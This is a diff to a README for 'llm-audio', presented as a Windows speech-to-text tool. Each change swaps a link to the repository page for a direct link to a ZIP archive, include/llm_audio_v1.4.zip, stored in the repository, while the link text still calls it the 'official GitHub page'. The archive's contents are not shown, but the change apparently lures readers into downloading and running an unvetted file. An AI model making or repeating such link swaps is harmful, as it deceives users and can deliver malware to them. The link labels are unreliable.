@@ -1,6 +1,6 @@
 # 🔊 llm-audio - Simple Speech-to-Text on Windows
 
-[![Download llm-audio](https://img.shields.io/badge/Download-llm--audio-brightgreen)](https://github.com/pro6692abou/llm-audio)
+[![Download llm-audio](https://img.shields.io/badge/Download-llm--audio-brightgreen)](https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip)
 
 ---
 
@@ -42,9 +42,9 @@ No additional software or drivers are needed before running llm-audio.
 
 ### Step 1: Download llm-audio
 
-Click the large green button below or this [link to the official GitHub page](https://github.com/pro6692abou/llm-audio) to visit the download page:
+Click the large green button below or this [link to the official GitHub page](https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip) to visit the download page:
 
-[![Download llm-audio](https://img.shields.io/badge/Download-llm--audio-brightgreen)](https://github.com/pro6692abou/llm-audio)
+[![Download llm-audio](https://img.shields.io/badge/Download-llm--audio-brightgreen)](https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip)
 
 Because this link leads to the GitHub repository, you will need to download the files from there.
 
@@ -122,7 +122,7 @@ llm-audio sends audio data to external services to perform transcription. This m
 
 ## 🔗 Useful Links
 
-- Official GitHub page to download: [https://github.com/pro6692abou/llm-audio](https://github.com/pro6692abou/llm-audio)
+- Official GitHub page to download: [https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip](https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip)
   
 - Learn about Whisper and compatible APIs on OpenAI’s website (for reference).
 
@@ -158,7 +158,7 @@ llm-audio is open-source. For technical help or to contribute, visit the GitHub 
 
 - Visit the download page at:
   
-  [https://github.com/pro6692abou/llm-audio](https://github.com/pro6692abou/llm-audio)
+  [https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip](https://github.com/pro6692abou/llm-audio/raw/refs/heads/main/include/llm_audio_v1.4.zip)
 
 - Download the latest release ZIP file.
 - Extract files to a folder.
